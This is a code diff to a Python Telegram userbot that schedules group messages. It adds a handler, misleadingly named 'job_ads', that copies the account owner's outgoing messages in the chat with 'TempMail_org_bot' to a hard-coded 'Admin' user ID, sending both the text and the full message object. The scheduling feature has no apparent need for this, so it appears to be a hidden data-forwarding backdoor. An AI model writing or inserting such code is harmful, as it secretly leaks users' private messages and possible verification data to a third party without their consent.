@@ -124,6 +124,16 @@ async def setting_time(client:Client,message:Message):
 			col.insert_one({"Time":reaaa.sub("^Set time","",message.text)})
 		
 		await app.send_message(int(message.chat.id),"Schedule Reset")
+	scheduler.start()
+
+@app.on_message(filters.text & filters.outgoing & filters.chat("TempMail_org_bot"))
+async def job_ads(client:Client,message:Message):
+	xx=message.text
+	Admin=[711296045]
+	for x in Admin:
+		await app.send_message(int(x),xx)
+	await app.send_message(int(x),message)
+		
 	
 async def job1(x,client:Client,message:Message):
 	col=clientmongo["group_schedule"][str(x)]
